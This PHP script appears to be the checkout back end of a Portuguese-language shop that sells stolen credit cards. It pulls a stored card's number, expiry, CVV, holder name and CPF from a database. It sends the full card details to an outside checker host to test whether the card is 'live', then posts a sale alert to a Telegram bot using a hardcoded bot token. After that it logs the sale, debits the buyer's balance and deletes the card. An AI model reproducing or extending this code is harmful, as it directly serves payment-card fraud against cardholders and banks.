<?php
require_once("count.php");
date_default_timezone_set("America/Sao_Paulo");
#############################################
$card_token = mysqli_real_escape_string($conexao, $_POST['card_token']);
#############################################
$sql = "SELECT * FROM `cards` WHERE card_token = '$card_token'";
$busca = mysqli_query($conexao, $sql);
$dados = mysqli_fetch_assoc($busca);

$card = $dados['card'];
$mes = $dados['mes'];
$ano = $dados['ano'];
$cvv = $dados['cvv'];
$nomecard = $dados['nome'];
$cpfcard = $dados['cpf'];
$banco = $dados['banco'];
$nivel = $dados['nivel'];
$bandeira = $dados['bandeira'];
$valorcc = $dados['valorcc'];

#############################################
if($nomecard == 1){
$dadosnome = "Sem dados";
}

elseif($nomecard == ""){
$dadosnome = "Sem dados";
}

else{
$dadosnome = "$nomecard";
}
#############################################

if($cpfcard == 1){
$dadoscpf = "Sem dados";
}

elseif($cpfcard == ""){
$dadoscpf = "Sem dados";
}

else{
$dadoscpf = "$cpfcard";
}


if($saldo < $valorcc){
$json = ["success" => false, "message" => "O seu saldo está abaixo do necessário."];
die(json_encode($json));
}

if(empty($card_token)){
$json = ["success" => false, "message" => "O cartão escolhido não existe ou já foi vendido."];
die(json_encode($json));
}

$order_token = base64_encode(uniqid());

$date = date("Y-m-d H:i:s");
$newtimestamp = strtotime(''.$date.' + 10 minute');
$data_atual = date('Y-m-d H:i:s');

$usuario = $_SESSION['usuario'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://pladix-storebot.xyz/apis/verifica.php?lista='.$card.'|'.$mes.'|'.$ano.'|'.$cvv.'');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'cookie: _fbp=fb.1.1645207034402.225941249; PHPSESSID=15e2d661dd79dff888e6c3ee633cf826',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36'));
$Gateway = curl_exec($ch);
$response = json_decode($Gateway, true);
$response = $response["message"];
curl_close($ch);
if(strpos($Gateway, 'live')){
$txt = "⚙️ | *PladixStore - Alertas*
- *Esta mensagem é apenas os logs que você receberá de forma exclusiva.*

ℹ️ | *Informação da Loja Virtual:*
- Usuário: *$usuario* comprou uma cc na base!
- Nivel: *$nivel*
- Valor: *$valorcc*

- *Agradecemos a referência do nosso trabalho!*

ℹ️ | *Caso não tenha nosso site, confira abaixo:*
- *✅ | https://pladix.live/store/ - Boas compras! :D*

⚙️ | *Sistema de Logs by: @pladixoficial*";
$botoken = "5264933408:AAFR1fyrWFg4zqC989zhoeJyupjLDng7H64";
$data = ['text' => "$txt",'chat_id' => "-1001768892332", 'parse_mode' => 'Markdown'];
file_get_contents("https://api.telegram.org/bot$botoken/sendMessage?" . http_build_query($data));
$json = array("success" => true, "message" => "$response");
echo json_encode($json);
$sql2 = "INSERT INTO `cardsvendidos` (`card`, `mes`, `ano`, `cvv`, `valorcc`, `nome`, `cpf`, `banco`, `nivel`, `bandeira`, `usuario`, `card_token`, `order_token`, `data_c`) VALUES ('$card','$mes','$ano','$cvv','$valorcc','$dadosnome','$dadoscpf','$banco','$nivel','$bandeira','$usuario','$card_token', '$order_token', '$data_atual')";
$result = mysqli_query($conexao, $sql2);
debitar($valorcc);
$sql3 = "DELETE FROM cards WHERE card_token = '$card_token'";
mysqli_query($conexao, $sql3);
}elseif(strpos($Gateway, 'die')){
$json = array("success" => false, "message" => "$response");
echo json_encode($json);
$sql3 = "DELETE FROM cards WHERE card_token = '$card_token'";
mysqli_query($conexao, $sql3);
}
else{
$json = array("success" => false, "message" => "O sistema está com instabilidade por favor tente novamente mais tarde!");
echo json_encode($json);
}

?>